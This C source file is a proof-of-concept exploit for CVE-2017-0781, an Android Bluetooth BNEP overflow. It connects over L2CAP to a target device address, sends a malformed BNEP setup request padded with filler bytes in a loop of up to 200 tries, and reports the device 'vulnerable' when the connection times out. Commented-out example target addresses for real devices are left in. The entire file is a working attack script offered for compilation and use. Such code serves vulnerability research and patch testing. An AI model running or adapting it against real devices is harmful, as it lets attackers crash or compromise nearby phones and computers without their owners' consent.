//copyright @
//huahuaisadog@gmail.com

/***
***Only for android devices***
usage:
$ gcc -o test CVE-2017-0781.c -lbluetooth
$ sudo ./test TARGET_ADDR
***/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>          
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>

#define __u8 unsigned char
#define __le16 unsigned short
#define __le32 unsigned int
#define __u16 unsigned short


static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
	int ret;
	struct l2cap_options option_arg;
	socklen_t len ;
	memset(&option_arg, 0 ,sizeof(option_arg));

	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
	if(ret == -1){
		perror("[-]getsockopt failed : ");
		return -1;
	}

	option_arg.imtu = imtu;
	option_arg.omtu = omtu;

	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
	if(ret == -1){
		perror("[-]setsockopt failed : ");
		return -1;
	}
	return 0;
}
#define BNEP_FRAME_CONTROL 0x01
#define BNEP_SETUP_CONNECTION_REQUEST_MSG 0x01
static int parse_fack_bnep_req(void *buffer, int data_len, void *data){
	__u8 type = BNEP_FRAME_CONTROL;
	__u8 extension_present = 1;
	__u8 ctrl_type = BNEP_SETUP_CONNECTION_REQUEST_MSG;
	__u8 len = 2;

	type = (extension_present << 7) | type;

	memcpy(buffer, &type, 1);
	memcpy(buffer + 1, &ctrl_type, 1);
	memcpy(buffer + 2, &len, 1);
	memcpy(buffer + 3, data, data_len);

	return data_len + 3;
}


static int send_bnep_req(int sock_fd) { 
	void *buffer;
	int total_len;
	buffer = malloc(0x100);
	memset(buffer, 0, 0x100);

	total_len = parse_fack_bnep_req(buffer, 0x20+4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

    printf("Sent bnep request\n");

	send(sock_fd, buffer, total_len, 0);
}

void main(int argc ,char* argv[]){
	int sock_fd, ret;
	int i;
	__le16 cont_offset;
	void *buf, *data, *recv_buf;
	int leak_req_count;
	char dest[18];
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;
	int retry_count = 200;
	if(argc != 2){
		printf("usage : sudo ./test TARGET_ADDR\n");
		return -1;
	}
	strncpy(dest, argv[1], 18);
	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
	// = "00:1a:7d:da:71:13"; //panyu
	while(retry_count-- > 0){

		sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
		if(sock_fd == -1){
			perror("[-]socket create failed : ");
			return -1;
		}

		memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
		local_l2_addr.l2_family = PF_BLUETOOTH;
		memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


		ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
		if(ret == -1){
			perror("[-]bind()");
			goto next;
		}

		memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
		remote_l2_addr.l2_family = PF_BLUETOOTH;
		remote_l2_addr.l2_psm = htobs(0xF);
		str2ba(dest, &remote_l2_addr.l2_bdaddr);

		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
	  		perror("[-]Can't connect");  
	  		if(errno == 110)
	  			goto vul;
			goto next;  
		} 

		sleep(1);

		send_bnep_req(sock_fd);	
	next:
		close(sock_fd);
	}
	printf("[+]maybe not vulnerable\n");
	return 0;
vul:
	close(sock_fd);
	printf("[+]device is vulnerable\n");
	return 0; 
}